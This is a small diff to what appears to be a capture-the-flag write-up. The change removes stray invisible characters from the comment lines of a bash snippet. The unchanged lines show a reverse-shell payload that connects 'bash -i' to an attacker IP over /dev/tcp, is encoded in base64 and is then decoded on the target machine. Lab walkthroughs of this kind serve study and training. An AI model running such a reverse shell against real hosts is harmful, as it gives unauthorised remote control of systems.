@@ -217,9 +217,9 @@ It seems like it may have patched out the unintended route... sort of, it is del
 
 Covert to base64 with 0 column wrapping to prevent multi-line base64 string
 ```bash
-​￼# Create payload
+​# Create payload
 echo "/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.14.109/1337 <&1'" | base64 -w0
-​￼# -w0 means wrap 0 columns 
+# -w0 means wrap 0 columns 
 ```
 Decode Payload on target machine:
 ```bash
